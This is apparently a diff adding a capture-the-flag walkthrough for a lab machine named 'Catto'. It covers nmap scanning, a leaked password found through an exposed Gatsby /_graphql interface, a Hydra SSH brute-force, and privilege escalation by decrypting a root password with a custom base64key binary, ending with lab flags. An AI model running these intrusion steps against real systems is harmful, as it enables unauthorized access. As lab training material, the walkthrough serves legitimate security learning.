@@ -1,0 +1,75 @@
+																							    Catto Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.139
+export IP=192.168.68.139
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+nmap -Pn -n -sC -sV -p8080,18080,30330,36123,38439,42022,50400 $IP --open --stats-every=5s -oN results.txt
+
+8080/tcp  open  http    nginx 1.14.1
+18080/tcp open  http    Apache httpd 2.4.37 ((centos))
+30330/tcp open  http    Node.js Express framework
+36123/tcp open  http    Node.js Express framework
+38439/tcp open  unknown
+42022/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+50400/tcp open  http    Node.js Express framework
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 8080 -sV --script vuln --stats-every=5s 
+nmap -n $IP -p 30330 -sV --script vuln --stats-every=5s 
+nmap -n $IP -p 36123 -sV --script vuln --stats-every=5s 
+nmap -n $IP -p 50400 -sV --script vuln --stats-every=5s 
+
+So, technology gathered
+
+8080/tcp  open  http    nginx 1.14.1                        // HTML5 UP
+30330/tcp open  http    Node.js Express framework  // Gatsby framework
+
+Gatsby applications in development mode provide a /_graphql interface, which is available at http://192.168.68.139:30330/_graphql
+Select allSitePage and click run. On the rights site you should see all the paths that are presents. Notice a interesting resource called new-server-config-mc.
+
+http://192.168.68.139:30330/new-server-config-mc                        // The new password for the MC server is: WallAskCharacter305
+
+we got a password, maybe we can get some potential users?
+
+http://192.168.68.139:30330/minecraft        //  sabel, yvette, zahara, sybilla, marcus, tabbatha and tabby 
+
+hydra -L users.txt -p WallAskCharacter305 $IP ssh -s 42022 -e nsr 
+
+marcus / WallAskCharacter305
+
+ssh marcus@$IP -p 42022
+
+cat local.txt              // 07566e616848019a758bd8b21d0279ef
+
+Privilege escalation
+
+cat .bash      // F2jJDWaNin8pdk93RLzkdOTr60==         ????
+
+Since we have a strong suspicion that base64 encoding is involved here, we can speculate that the developer could have simply XORed the plaintext of the scheme with the key, before feeding it into the base64 encoding algorithm. Some other rudimentary operation with the key bytes could have been employed just as well.
+The main takeaway of this thought process is that we are looking for another binary here. We are looking for a custom base64-based encryption/decryption binary that the developer actually used to generate this ciphertext. Let's look for it on the target with the assumption that the string base64 is somewhere in the name.
+
+find / -type f -name "*base64*" 2>/dev/null
+
+/usr/bin/base64
+/usr/bin/base64key
+
+base64key
+Usage: ./a.out message key (0:encrypt|1:decrypt)
+./a.out "Hello world" MYPRIVATEKEY 0
+./a.out ttz9JqxZHBClNtu= MYPRIVATEKEY 1
+
+ We have a password that has already been reused once. What if it was simply reused again for this purpose...
+
+/usr/bin/base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
+SortMentionLeast269
+
+su root
+SortMentionLeast269
+cd /root
+cat /proof.txt    // 9e0d3f730bf35e3044622011d8fd730e
